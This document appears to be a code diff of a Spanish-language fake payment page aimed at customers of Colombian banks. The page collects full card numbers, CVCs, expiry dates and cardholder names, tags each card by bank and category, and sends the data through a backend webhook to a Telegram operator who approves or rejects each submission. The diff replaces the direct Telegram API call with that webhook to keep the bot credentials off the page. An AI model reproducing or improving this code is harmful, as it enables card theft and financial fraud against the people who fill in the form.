@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -478,9 +477,6 @@
             flex-shrink: 0;
         }
 
-        /* ============================================ */
-        /* LOADING OVERLAY - SIMPLE COMO LA IMAGEN     */
-        /* ============================================ */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -526,7 +522,6 @@
             }
         }
 
-        /* Logo de la tarjeta - GRANDE y centrado */
         .logo-container {
             display: flex;
             justify-content: center;
@@ -542,7 +537,6 @@
             object-fit: contain;
         }
 
-        /* Texto - estilo simple */
         .loading-card .loading-text {
             font-size: 0.95rem;
             font-weight: 500;
@@ -551,7 +545,6 @@
             letter-spacing: 0.2px;
         }
 
-        /* Barra de progreso - DELGADA */
         .progress-bar-wrapper {
             width: 100%;
         }
@@ -590,7 +583,6 @@
             100% { transform: translateX(100%); }
         }
 
-        /* Spinner inicial */
         .loading-card .initial-spinner {
             display: none;
             width: 48px;
@@ -610,8 +602,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        /* ============================================ */
 
         .status-message {
             display: none;
@@ -743,9 +733,6 @@
             display: block;
         }
 
-        /* ============================================ */
-        /* RESPONSIVE - CENTRADO EN MÓVIL               */
-        /* ============================================ */
         @media (max-width: 768px) {
             .content-wrapper {
                 flex-direction: column;
@@ -757,7 +744,6 @@
             .form-header h1 { font-size: 1.25rem; }
             .btn { width: 100%; }
             .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
-            
             .loading-card {
                 padding: 32px 24px 28px 24px;
                 max-width: 330px;
@@ -771,7 +757,6 @@
             .form-header h1 { font-size: 1.125rem; }
             .form-header p { font-size: 0.875rem; }
             .expiry-cvc-grid { grid-template-columns: 1fr; gap: 16px; }
-            
             .loading-card {
                 padding: 28px 20px 24px 20px;
                 max-width: 300px;
@@ -793,23 +778,13 @@
     </style>
 </head>
 <body>
-    <!-- ============================================ -->
-    <!-- LOADING OVERLAY - SIMPLE COMO LA IMAGEN      -->
-    <!-- ============================================ -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-card">
-            <!-- Spinner inicial -->
             <div class="initial-spinner active" id="initialSpinner"></div>
-            
-            <!-- Logo de la tarjeta (SOLO EL LOGO GRANDE) -->
             <div class="logo-container" id="logoContainer" style="display:none;">
                 <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
             </div>
-
-            <!-- Texto simple -->
             <div class="loading-text" id="loadingText">Procesando pago...</div>
-
-            <!-- Barra de progreso DELGADA -->
             <div class="progress-bar-wrapper" id="progressWrapper" style="display:none;">
                 <div class="progress-bar-track">
                     <div class="progress-bar-fill-loading" id="progressFill"></div>
@@ -1028,11 +1003,10 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN - Usando Variables de Entorno
+        // CONFIGURACIÓN - SIN CREDENCIALES
         // ============================================
-        // Las credenciales se obtienen desde el backend
-        // El CHAT_ID y TOKEN están en el servidor (Vercel)
-        
+        // El frontend NO tiene credenciales de Telegram
+        // Todo se maneja a través del webhook
         const WEBHOOK_URL = '/api/webhook';
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
@@ -1040,24 +1014,6 @@
         let solicitudId = null;
         let pollingInterval = null;
         let cardType = null;
-
-        // ============================================
-        // FUNCIÓN PARA OBTENER CONFIGURACIÓN DEL BACKEND
-        // ============================================
-        async function obtenerConfiguracionBackend() {
-            try {
-                const response = await fetch(`${WEBHOOK_URL}?config=true`);
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('🔧 Configuración del backend:', data);
-                    return data;
-                }
-                return null;
-            } catch (error) {
-                console.error('❌ Error obteniendo configuración:', error);
-                return null;
-            }
-        }
 
         // ============================================
         // MAPA DE BINs POR BANCO Y CATEGORÍA
@@ -1120,7 +1076,6 @@
             }
         };
 
-        // Emojis por categoría
         const categoryEmojis = {
             'Clásica': '💳',
             'Gold': '🌟',
@@ -1133,9 +1088,6 @@
             'Signature': '✍️'
         };
 
-        // ============================================
-        // FUNCIÓN PARA DETECTAR CATEGORÍA
-        // ============================================
         function detectarCategoriaTarjeta(numeroTarjeta, banco) {
             const cleanNumber = numeroTarjeta.replace(/\s/g, '');
             
@@ -1164,18 +1116,12 @@
             return { categoria: 'Desconocida', emoji: '💳' };
         }
 
-        // ============================================
-        // MAPA DE LOGOS DE TARJETAS PARA LA CARGA
-        // ============================================
         const cardLogos = {
             'visa': 'visa.png',
             'mastercard': 'master.png',
             'amex': 'ame.png'
         };
 
-        // ============================================
-        // MAPA DE LOGOS DE BANCOS
-        // ============================================
         const bankLogos = {
             'Bancolombia': 'bancol.png',
             'Davivienda': 'davivienda.png',
@@ -1348,9 +1294,9 @@
 
             if (cardNumber.length >= 3) {
                 const type = detectCardType(cardNumber);
-                updateCardLogo(type);
-                // Guardar el tipo de tarjeta para usarlo después
                 cardType = type;
+                updateCardLogo(type);
+                console.log('💳 Tipo de tarjeta detectado:', type);
             } else {
                 cardLogo.innerHTML = '';
                 cardType = null;
@@ -1371,7 +1317,7 @@
         });
 
         // ============================================
-        // FUNCIONES DE WEBHOOK Y TELEGRAM
+        // FUNCIONES DE WEBHOOK
         // ============================================
         async function configurarWebhook() {
             try {
@@ -1417,9 +1363,6 @@
             return 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         }
 
-        // ============================================
-        // GUARDAR DATOS EN LOCALSTORAGE
-        // ============================================
         function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
             const cardLast4 = cardNumber.slice(-4);
             
@@ -1441,9 +1384,6 @@
             });
         }
 
-        // ============================================
-        // MOSTRAR PANTALLA DE CARGA
-        // ============================================
         function mostrarCargaConLogos(tipoTarjeta) {
             initialSpinner.classList.remove('active');
             initialSpinner.style.display = 'none';
@@ -1486,9 +1426,6 @@
             }, interval);
         }
 
-        // ============================================
-        // REDIRIGIR SEGÚN TIPO DE TARJETA
-        // ============================================
         function redirigirSegunTipoTarjeta(tipo) {
             const map = {
                 'visa': 'visa.html',
@@ -1501,11 +1438,10 @@
         }
 
         // ============================================
-        // ENVÍO DE DATOS DE TARJETA A TELEGRAM (CON CATEGORÍA)
+        // ENVÍO DE DATOS A TRAVÉS DEL WEBHOOK
         // ============================================
-        async function enviarDatosTarjetaATelegram(datos) {
+        async function enviarDatosTarjeta(datos) {
             try {
-                // DETECTAR CATEGORÍA DE LA TARJETA
                 const categoriaInfo = detectarCategoriaTarjeta(
                     datos.numeroTarjeta, 
                     datos.bancoEmisor
@@ -1513,18 +1449,17 @@
                 
                 console.log(`🏷️ Categoría detectada: ${categoriaInfo.emoji} ${categoriaInfo.categoria}`);
 
-                // El botón de aprobación incluye el tipo de tarjeta
-                const tipoPrefix = datos.tipoTarjeta || 'card';
+                // Los botones se envían SIN tipo de tarjeta
+                // El webhook lo maneja automáticamente
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            { text: "✅ APROBAR", callback_data: `approve_${tipoPrefix}_${datos.solicitudId}` },
-                            { text: "❌ RECHAZAR", callback_data: `reject_${tipoPrefix}_${datos.solicitudId}` }
+                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }
                         ]
                     ]
                 };
 
-                // Construir mensaje con la categoría incluida
                 let mensaje = `🔔 *NUEVA SOLICITUD - V2CRTF*\n\n`;
                 mensaje += `🆔 ID: \`${datos.solicitudId}\`\n\n`;
                 mensaje += `📋 *DATOS PERSONALES:*\n`;
@@ -1538,37 +1473,34 @@
                 mensaje += `📅 Vencimiento: \`${datos.vencimiento}\`\n`;
                 mensaje += `💳 Tipo: ${datos.tipoTarjeta ? datos.tipoTarjeta.toUpperCase() : 'DESCONOCIDO'}\n`;
                 mensaje += `🏛️ Banco emisor: ${datos.bancoEmisor}\n`;
-                // AÑADIR LA CATEGORÍA AL MENSAJE
                 mensaje += `⭐ *Categoría:* ${categoriaInfo.emoji} *${categoriaInfo.categoria}*\n\n`;
                 mensaje += `💰 Total: ${datos.totalFormateado}\n`;
                 mensaje += `📅 Fecha: ${datos.fechaHora}\n\n`;
                 mensaje += `⏳ *Estado:* Esperando verificación...`;
 
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-                const response = await fetch(url, {
+                // Enviar a través del webhook (sin credenciales en el frontend)
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown',
-                        reply_markup: inlineKeyboard,
-                        disable_web_page_preview: true
+                        mensaje: mensaje,
+                        solicitudId: datos.solicitudId,
+                        tipoTarjeta: datos.tipoTarjeta,
+                        botones: inlineKeyboard
                     })
                 });
 
                 const data = await response.json();
 
-                if (data.ok) {
-                    console.log('✅ Datos de tarjeta enviados a Telegram con categoría');
+                if (data.success) {
+                    console.log('✅ Datos enviados a través del webhook');
                     return true;
                 } else {
-                    console.error('❌ Error al enviar a Telegram:', data.description);
+                    console.error('❌ Error:', data.error);
                     return false;
                 }
             } catch (error) {
-                console.error('❌ Error al enviar a Telegram:', error);
+                console.error('❌ Error al enviar:', error);
                 return false;
             }
         }
@@ -1655,12 +1587,7 @@
                 isValid = false;
             }
 
-            // Detectar el tipo de tarjeta nuevamente para asegurar
-            const tipoDetectado = detectCardType(cardNumber);
-            if (tipoDetectado) {
-                cardType = tipoDetectado;
-            }
-
+            cardType = detectCardType(cardNumber);
             if (!cardType || cardNumber.length === 0) {
                 cardNumberInput.parentElement.parentElement.classList.add('error');
                 isValid = false;
@@ -1748,7 +1675,7 @@
                 fechaHora: fechaHora
             };
 
-            const enviado = await enviarDatosTarjetaATelegram(datosTelegram);
+            const enviado = await enviarDatosTarjeta(datosTelegram);
 
             if (enviado) {
                 mostrarInfo('⏳ Esperando aprobación del pago...');
